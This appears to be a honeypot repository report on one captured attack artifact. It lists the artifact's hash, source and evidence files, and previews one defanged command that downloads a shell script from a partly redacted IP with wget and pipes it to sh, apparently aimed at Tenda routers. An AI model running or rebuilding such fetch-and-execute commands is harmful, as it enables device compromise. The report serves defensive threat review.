# 2f20fa518e9f7fb8de5965c1f55d338f80b102de5cc5d0a471d809621c78a55d

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `2f20fa518e9f7fb8de5965c1f55d338f80b102de5cc5d0a471d809621c78a55d` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
mac=;cd /tmp;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s tendaac6;busybox wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s tend
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
